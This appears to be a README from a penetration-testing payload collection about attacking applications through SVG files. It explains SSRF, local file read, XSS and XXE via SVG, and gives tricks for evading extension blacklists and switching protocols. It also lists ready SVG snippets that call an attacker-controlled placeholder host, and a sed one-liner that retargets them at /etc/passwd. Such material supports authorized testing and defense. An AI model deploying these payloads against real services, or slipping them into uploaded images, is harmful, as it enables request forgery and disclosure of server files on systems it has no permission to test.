## SVG Attacks 

This pretty image format is a vector based image defined in XML. 
This section contains SVG images with payloads, in some files you need to change YOUR-SERVER.COM to your domain if you want to catch DNS or HTTP requests or change protocol to file://. You can easily do it with bash:
```
grep -rli 'http:\/\/YOUR-SERVER.COM:80' * | xargs -i@ sed -i 's/http:\/\/YOUR-SERVER.COM:80/file:\/\/etc/passwd/g' @
```


### What do you need to know:

1. In SVG you can define links to external resources, so this can lead to SSRF attack or local file read. 
2. SVG can contain JavaScript code and if content-type in HTTP Response is image/svg+xml JS will be executed. 
3. XML? XXE!
4. If SVG image is rendered to some raster image format (e.g. PNG, JPG, .., etc) then 1 and 3 can lead to an interesting result, you can render some text files or images in result image.

### Some useful tricks

1. If SVG extension blacklisted - **try to change to whitelisted extenstion PNG/JPG/GIF**. Some libraries recognize the file format by it's content.
2. Default SSRF tricks - **try to change protocol (e.g. ftp://, https://, file:// or SMB '\\\\your-domain\\share'), port (e.g. 53,22,443)**
3. Create a HTML page on your web-site with malicius SVG files, some crawlers may render HTML to some kind of preview and SVG files will be parsed and rendered too.

Some SSRF examples:

**Define an external image**
```
<image height="100" width="100" xlink:href="http://YOUR-SERVER.COM:80/" />
```
```
<feImage xlink:href="http://YOUR-SERVER.COM:80/" width="200" height="200"/>
```

**External stylesheet**
```
<?xml-stylesheet type="text/css" href="http://YOUR-SERVER.COM:80"?>
```
```
<style>
   @import url(http://YOUR-SERVER.COM:80/);
</style>
```


**External fill source.** [Cool story about this from HackerOne](https://hackerone.com/reports/347139) 
```
<rect fill="url(http://YOUR-SERVER.COM:80)">
```

**Defining an iframe**
If iframe is rendered then you can try to read files or make arbitrary requests
```
<foreignObject width="100" height="100">
    <iframe src="http://YOUR-SERVER.COM:80"></iframe>
</foreignObject>
```

**Defining an external CSS**
```
  <style>
    @import url(http://YOUR-SERVER.COM:80/);
  </style>
```

[There is more SVG tags which includes xlink:href attribute](https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/xlink:href)

**Some links:**

[SSRF via xlink SVG, fingerprinting libraries](
https://medium.com/@arbazhussain/svg-xlink-ssrf-fingerprinting-libraries-version-450ebecc2f3c)

[SVGSalamander CVE-2017-5617, Java library for SVG handling](https://github.com/blackears/svgSalamander/issues/11)

[Another collection of SVG SSRF payloads](
https://github.com/cujanovic/SSRF-Testing/tree/master/svg)

[XSS via SVG (Bug Bounty Paragon Initiative Enterprises)](https://hackerone.com/reports/148853)

[SSRF via xlink (Bug Bounty Shopify)](https://hackerone.com/reports/223203)

[SSRF via fill (Bug Bounty Rockstar Games)](https://hackerone.com/reports/265050)
